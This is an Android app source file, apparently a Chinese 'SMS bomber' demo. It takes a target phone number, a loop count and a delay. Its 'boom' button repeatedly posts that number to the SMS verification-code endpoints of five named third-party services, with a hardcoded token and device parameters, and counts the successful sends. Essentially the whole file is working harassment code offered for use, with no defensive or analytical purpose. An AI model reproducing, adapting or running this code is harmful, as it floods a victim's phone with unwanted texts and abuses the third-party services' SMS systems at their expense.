package com.sms.smsdemo;

import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.jiangyu.common.base.BaseActivity;
import com.jiangyu.common.entity.EventCenter;
import com.jiangyu.common.utils.CommonUtils;
import com.jiangyu.common.utils.SharedPreferencesUtil;
import com.jiangyu.common.utils.StringUtil;
import com.jiangyu.common.utils.TimeUitls;
import com.jiangyu.common.utils.ToastUtil;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import butterknife.Bind;
import butterknife.OnClick;

public class MainActivity extends BaseActivity {

    @Bind(R.id.phone)
    EditText phone;
    @Bind(R.id.loop_count)
    EditText loopCount;
    @Bind(R.id.time_sleep)
    EditText timeSleep;
    @Bind(R.id.boom)
    Button boom;
    @Bind(R.id.stop)
    Button stop;
    @Bind(R.id.log)
    TextView log;
    private int successNumber = 0;//成功次数
    private int sloopCount = 1;//循环次数
    private StringCallback callback = new StringCallback() {
        @Override
        public void onSuccess(final Response<String> response) {
            if (response.body().contains("成功")
                    || response.body().contains("验证码已")
                    || response.body().contains("已发送")
                    || (response.body().contains("isError") && response.body().contains("false"))
                    || response.body().contains("ok")
                    || response.body().contains("true")
                    || response.body().contains("Succeed")
                    || response.body().contains("succeed")
                    || response.body().contains("Success")
                    || response.body().contains("success")) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        ToastUtil.showShort(response.body());
                        log.setText("当前循环：" + (sloopCount - 1) + "\n成功次数:" + ++successNumber);
                    }
                });
            } else {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        log.setText("当前循环：" + (sloopCount - 1) + "\n成功次数:" + successNumber);
                    }
                });
            }
        }

        @Override
        public void onError(final Response<String> response) {
            super.onError(response);
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    ToastUtil.showShort(response.body());
                }
            });
        }
    };
    private Thread thread;

    @OnClick({R.id.boom, R.id.stop})
    public void onViewClicked(View view) {
        int viewId = view.getId();
        switch (viewId) {
            case R.id.boom:
                successNumber = 0;
                sloopCount = 1;
                String sphone = phone.getText().toString();
                sloopCount = Integer.parseInt(loopCount.getText().toString());
                SharedPreferencesUtil.setValue(mContext, "phone", sphone);
                if (!CommonUtils.isMobileNoValid(sphone)) {
                    ToastUtil.showShort("Please enter the 11 phone number");
                    return;
                }
                thread = new Thread(boomRun);
                thread.start();
                break;
            case R.id.stop:
                thread.interrupt();
                ToastUtil.showShort("stop");
                break;
        }

    }

    private Runnable boomRun = new Runnable() {
        @Override
        public void run() {
            String sphone = phone.getText().toString();
            String stimeSleep = timeSleep.getText().toString();
            try {
                OkGo.<String>post("http://pod.dsylove.com/user/getSmsCode").params("phoneNum", sphone).params("appName", "dsylove").headers("token", "986244129").tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://api2.quhepai.com/user/getsmscode?os=Android&model=SM-G930F&area_id=110000&rctk=&imei=865821079483270&hpid=&ver=1.6.9&long=106.67963615746643&build=1712211344&token_temp=&netk=&nonce=1515146882410&token=&sa=SvWDOSgflCTktWN2gZJeA26s%2FKsJfvkYUf3h8KsEJ%2FxBUE3KOW%2BlQWy3g9bqRlNZ0EYGzUKwOb%2F0%0AYgOREoKTl3mmqa2pcsblrYUDbkDcT8dQiWJ9VxTaKqeIEbVl38VE4rXB1avYbPR2zOkD28c7%2Fas%2F%0Ap0R38lq3nziMVHRap34%3D&company=samsung&logined=0&api=39&verCode=446&user_id=&ch=hepai_s_018&lat=26.636185489185326&type=1&phone=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://www.1yuanxing.com/apiAngular/getSMS.jsp?username=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("http://api-cc.babybus.org/User/VerificationCode?al=403&ost=1&type=1&channel=A002&phone=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://api2.drcuiyutao.com/v55/user/sendVerificationCode?dialCode=86&mobile=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);




                if (--sloopCount > 0) {
                    thread = new Thread(boomRun);
                    thread.start();
                } else {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            ToastUtil.showShort("finish");
                        }
                    });
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };


    @Override
    protected void onEventComing(EventCenter var1) {

    }

    @Override
    protected void initComponents() {
        String oldphone = SharedPreferencesUtil.getValue(mContext, "phone");
        if (!StringUtil.isEmpty(oldphone)) {
            phone.setText(oldphone);
        }
    }

    @Override
    protected void initData() {

    }

    @Override
    protected int getMainContentViewId() {
        return R.layout.activity_main;
    }
}
